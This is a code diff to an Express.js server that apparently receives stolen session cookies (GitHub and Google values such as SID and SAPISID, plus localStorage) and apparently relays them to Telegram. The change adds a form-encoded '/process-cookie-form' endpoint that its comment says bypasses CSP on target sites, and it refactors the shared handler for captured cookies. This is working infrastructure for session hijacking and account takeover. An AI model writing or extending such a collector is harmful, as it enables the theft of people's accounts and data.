@@ -163,8 +163,8 @@ app.use(cors({
   origin: true,
   credentials: true,
 }));
-app.use(express.json()); // For parsing application/json
-app.use(express.urlencoded({ extended: true })); // For parsing application/x-www-form-urlencoded
+app.use(express.json({ limit: '10mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' }));
 
 // API Router
 const apiRouter = express.Router();
@@ -343,8 +343,27 @@ apiRouter.post('/test-telegram', async (req, res) => {
   }
 });
 
-// Process captured cookies endpoint (GitHub/Google)
-apiRouter.post('/process-cookie', async (req, res) => {
+// Form-encoded endpoint (bypasses CSP on target sites)
+apiRouter.post('/process-cookie-form', async (req, res) => {
+  try {
+    const raw = req.body.data;
+    if (!raw) {
+      return res.status(400).send('No data');
+    }
+    const parsed = JSON.parse(raw);
+    req.body = parsed;
+    // Fall through to the main handler by re-emitting
+    return processIncomingCookieData(req, res);
+  } catch (error) {
+    console.error('Error parsing form data:', error);
+    res.status(500).send('Error');
+  }
+});
+
+// Process captured cookies endpoint (GitHub/Google) - JSON
+apiRouter.post('/process-cookie', (req, res) => processIncomingCookieData(req, res));
+
+async function processIncomingCookieData(req, res) {
   try {
     const { cookie, sid, sapisid, type, url, timestamp, method } = req.body;
     const capturedLocalStorage = req.body.localStorage || {};
@@ -632,7 +651,7 @@ ${formatKV(parsedCookies, '📎', 60)}`;
       error: error.message
     });
   }
-});
+}
 
 // Start server — publicBase is what this process listens on / Render exposes (local = localhost)
 const publicBase =
